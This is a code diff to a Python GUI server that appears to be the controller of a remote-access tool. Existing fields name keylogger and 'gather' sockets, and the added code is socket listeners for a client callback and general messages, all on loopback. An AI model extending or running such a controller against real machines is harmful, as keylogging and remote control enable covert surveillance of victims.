@@ -29,6 +29,8 @@ class App(customtkinter.CTk):
     keylog_SOPORT = 65230
     gather_SOIP = "127.0.0.69"
     gather_SOPORT = 42069
+    genSoc_SOIP = "127.0.0.1"
+    genSoc_SOPORT = 46969
 
     # Important Strings
     sep = ":***:"
@@ -169,9 +171,28 @@ class App(customtkinter.CTk):
 
         def create_CLI_socket():
             global cli
-            HOST = self.cli_SOIP  # Standard loopback interface address (localhost)
-            PORT = self.cli_SOPORT  # Port to listen on (non-privileged ports are > 1023)
-            # Start  CLI socket
+            print("Created CLI socket")
+            while True:
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as Ip_info: # This will get the Clients IP and Port so that the CLI can connect
+                        Ip_info.bind(("127.0.0.1", 44404))
+                        Ip_info.listen(1)
+                        conn, addr = Ip_info.accept()
+                        with conn:
+                            print("CONNECTEDDDDDDD")
+                            while True: 
+                                msg = conn.recv(128).decode("utf-8")
+                                if msg:
+                                    try:
+                                        HOST = msg.split(";")[0]  
+                                        PORT = int(msg.split(";")[1])
+                                        self.m_textbox.insert("0.0", f"\nClient IP:{HOST}\nClient PORT:{PORT}\n")
+                                        time.sleep(0.5)
+                                        conn.send(bytes("continue", 'utf-8'))
+                                        break
+                                    except: print(f"Host: {HOST}\nPort: {PORT}")
+                        
+                break  
+            
             while True:
                 try:    
                     cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -184,6 +205,7 @@ class App(customtkinter.CTk):
                     break
                 except Exception as e: print(f"Thrown Exception CLI: {e}")
                 time.sleep(3)
+
             #? Checks if the client is still connected
             while True:
                 print("Checking client status.")
@@ -353,6 +375,36 @@ class App(customtkinter.CTk):
          
         start_file_name_socket()
         start_file_transfer_socket()
+
+        #? GMS- General Message Socket
+        def startGeneralSocket():
+            t_gms = threading.Thread(target=createGeneralSocket)
+            t_gms.daemon = True
+            t_gms.start()
+
+        def createGeneralSocket():
+            HOST = self.genSoc_SOIP
+            PORT = self.genSoc_SOPORT 
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as gms_socket:
+                    self.SERVER_SOCKETS.append(gms_socket)
+                    self.m_textbox.insert("0.0", f"\nGMS client operational.\n") 
+                    while True:
+                        # Wait for client connection
+                        gms_socket.bind((HOST, PORT))
+                        gms_socket.listen()
+                        conn, addr = gms_socket.accept()
+                        with conn:
+                            self.CLIENT_IP.append(addr)
+                            self.m_textbox.insert("0.0", f"\nGMS client connected.\n")  
+                            while True:
+                                msg = conn.recv(128).decode("utf-8")
+                                if msg:
+                                    self.m_textbox.insert("0.0", f"\nGMS Client message recieved: {msg}\n")
+        startGeneralSocket()
+
+
+
+                        
     ############################################################################################
     #                                        Functions                                         #
     ############################################################################################
